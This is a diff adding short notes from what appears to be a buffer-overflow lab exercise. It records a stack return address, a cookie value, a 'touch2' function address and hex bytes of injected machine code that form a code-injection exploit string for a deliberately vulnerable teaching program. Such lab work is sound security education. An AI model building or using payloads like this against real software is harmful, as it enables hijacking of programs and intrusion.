@@ -1,0 +1,18 @@
+Return address location:
+0x 55 68 5f ec
+
+68 30 51 c1 40 5f 68 1d 19 40 00 41 5d  c3  
+
+
+Cookie:
+ 0x40c15130
+
+Touch2 Address:
+00 40 19 1d
+
+
+68 1d 19 40 
+00 5f bf ec 
+5f 68 55 68 
+30 51 c1 40 
+5f c3
